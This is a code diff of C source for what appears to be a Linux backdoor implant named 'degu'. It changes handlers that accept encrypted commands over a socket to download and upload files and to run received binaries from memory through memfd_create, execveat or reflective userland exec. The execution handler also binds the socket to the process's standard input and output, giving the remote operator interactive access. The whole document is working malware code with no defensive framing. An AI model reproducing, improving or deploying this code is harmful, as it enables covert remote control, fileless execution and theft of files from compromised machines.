@@ -13,43 +13,18 @@
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <sys/syscall.h>
-#include <sys/utsname.h>
-
 
 #include "degu.h"
 
-unsigned int is_kernel_ok(){
-    struct utsname curkernel;
-    int rut =  uname(&curkernel);
-
-    if(rut == -1)
-        return 0;
-
-    char *major = strtok(curkernel.release,".");
-    char *minor = strtok(NULL,".");
-    int imaj = atoi(major);
-    int imin = atoi(minor);
-
-    if (imaj < 3 )
-        return 0;
-
-    if (imaj > 3 )
-        return 1;
-
-    if( imaj == 3 && imin >= 17 )
-        return 1;
-
-    return 0;
-
+int degu_ulexec(unsigned char *bin, char *argv[],size_t size){
+    return reflect_execv(bin, argv,size);
 }
 
 int degu_memfd_create(char *name, int flags){
 
-    int ret = -1;
+    int ret = syscall(319, name, flags);
 
-    if (is_kernel_ok()){
-        ret = syscall(319, name, flags);
-    }else{
+    if (ret == -1){
         char file[] = "/dev/shm/.XXXXXX";
         ret = mkstemp(file);
         fchmod(ret, 0755);
@@ -63,12 +38,8 @@ int degu_memfd_create(char *name, int flags){
 int degu_execveat(int dirfd, char *pathname,char *argv[],
                   char *envp[], int flags){
 
-    int ret = -1;
-
-    if (is_kernel_ok()){
-        ret = syscall(322, dirfd, pathname, argv, envp, flags);
-    }
-
+    int ret = syscall(322, dirfd, pathname, argv, envp, flags);
+    
     if (ret == -1){
         char cmd[4096] = {0};
         sprintf(cmd,"/proc/%i/fd/%i",getpid(),dirfd);
@@ -79,6 +50,17 @@ int degu_execveat(int dirfd, char *pathname,char *argv[],
    return ret;
 }
 
+
+int degu_send(int socket, unsigned char *ptr, size_t length){
+    int total = length;
+    while (length > 0){
+        int i = send(socket, ptr, length, 0);
+        if ( i < 0 ) return i;
+        ptr += i;
+        length -= i;
+    }
+    return total;
+}
 
 //|Oo<<|lenpath*4|path
 void knock_handle_dl(int sock,unsigned  char *header,unsigned char *secret){
@@ -108,7 +90,7 @@ void knock_handle_dl(int sock,unsigned  char *header,unsigned char *secret){
         r+=i;
     }
 
-    xcrypt_data(secret, payload, total_len);
+    xdata(secret, payload, total_len);
 
     char *path = malloc(lpath + 1);
 
@@ -132,7 +114,7 @@ void knock_handle_dl(int sock,unsigned  char *header,unsigned char *secret){
     flen[0] = (file_stat.st_size >> 24) & 0xFF;
     flen[1] = (file_stat.st_size >> 16) & 0xFF;
     flen[2] = (file_stat.st_size >> 8) & 0xFF;
-    flen[3] = file_stat.st_size & 0xFF;
+    flen[3] =  file_stat.st_size & 0xFF;
 
     unsigned int delta = 32 - ((file_stat.st_size + 4 ) % 32);
 
@@ -144,9 +126,9 @@ void knock_handle_dl(int sock,unsigned  char *header,unsigned char *secret){
     ssize_t reslen = file_stat.st_size + 4 + delta;
     TRACE("total len = %i ",reslen);
 
-    xcrypt_data(secret, response, reslen);
+    xdata(secret, response, reslen);
 
-    send(sock, response, reslen, 0);
+    degu_send(sock, response, reslen);
 
     close(file);
     free(payload);
@@ -186,12 +168,12 @@ void knock_handle_up(int sock,unsigned  char *header,unsigned char *secret){
     int i;
 
     while ( r < total_len ){
-        i = recv(sock, payload + r, 32, 0);
-        if(i == -1) break;
+        i = recv(sock, payload + r, 1024, 0);
+        if ( i < 0 ) break;
         r+=i;
     }
 
-    xcrypt_data(secret, payload, total_len);
+    xdata(secret, payload, total_len);
 
     char *path = malloc(lpath * sizeof *path + 1 );
 
@@ -233,8 +215,12 @@ void knock_handle_exe(int sock,unsigned  char *header,unsigned char *secret){
 
 
         // 13 == header + lenbin + lenargv + argc(<255)
-        ssize_t total_len = lbin + largv + 13;
-        unsigned char *payload = malloc( total_len * sizeof *payload );
+        ssize_t total_len = lbin + largv + 13 ;
+        TRACE("total_len = %i lbin = %i largv = %i ",total_len,lbin,largv);
+        
+        unsigned char *payload = malloc( total_len );
+        
+        bzero(payload,total_len);
 
         if(payload == NULL)
             return;
@@ -243,65 +229,56 @@ void knock_handle_exe(int sock,unsigned  char *header,unsigned char *secret){
 
         while ( r < total_len ){
             i = recv(sock, payload + r, 32, 0);
-            if(i == -1) break; // XXX test exe consistence
+            if(i == -1) break; 
             r+=i;
         }
 
-        xcrypt_data(secret, payload, total_len);
+        xdata(secret, payload, total_len);
 
         unsigned char *bin = payload + 13 + largv;
 
-        //TRACE("exelen %i argvlen %i argc %x",lbin, largv, argc);
-
-        cur += 1;
-        char * str_argv = malloc((largv + 1) * sizeof *str_argv);
+        char * str_argv = malloc(largv + 1);
 
         memset(str_argv, 0, largv + 1);
-        memcpy(str_argv, payload + 13, largv); // skip first 13 bytes of header for argv
+        memcpy(str_argv, payload + 13, largv);
 
         //ugliest way to get argv didn't found worst way
         char **argv = NULL;
         int index = 0;
-        char *tok = strtok(str_argv, " ");
 
+        char *tok = strtok(str_argv, " ");
         while(tok != NULL) {
             argv = realloc(argv, sizeof(char*) * (index + 1) );
-            char *dup = malloc(strlen(tok) + 1);
-            strcpy(dup, tok);
-            argv[index++] = dup;
+            argv[index++] = strdup(tok);
             tok = strtok(NULL, " ");
         }
         argv = realloc(argv, sizeof(char*)*(index+1));
         argv[index] = NULL;
 
-        int fd = degu_memfd_create("", 1);
-        write(fd, bin, lbin);
-
-
-        pid_t pid = -1;
-
-        pid = fork();
-        if(pid == -1){
-            TRACE("fork error");
-            return;
+        for (int f=0;f<1024;f++)
+            if (f != sock)
+                close(f);
+        
+        dup2(sock,0);
+        dup2(sock,1);
+        close(2);
+        close(sock);
+        
+        int ret = 1;
+        
+        if (memcmp(DEGU_EXE_UL,header,4)==0){
+            ret = degu_ulexec(bin,argv,lbin+1024);
         }
-        if(pid == 0){
-            degu_execveat(fd, "", argv, NULL, 0x1000); // persistant after father process died TODO
-
-
-            close(fd);
-            exit(EXIT_SUCCESS);
-        }else
-            signal(SIGCHLD,SIG_IGN);
-
-        free(payload);
-        free(str_argv);
-        close(fd);
+        if(ret == 1){
+            int fd = degu_memfd_create("", 1);
+            write(fd, bin, lbin + 1024);
+            degu_execveat(fd, "", argv, NULL, 0x1000); 
+        }
+        exit(EXIT_SUCCESS);
 }
 
 
 //rand[32]|len[2]|cmd[len]|sig[64]
-
 void knock_ghost_exe(unsigned  char *buffer, size_t len){
 
     unsigned char *cmd = malloc( len + 1 ) ;
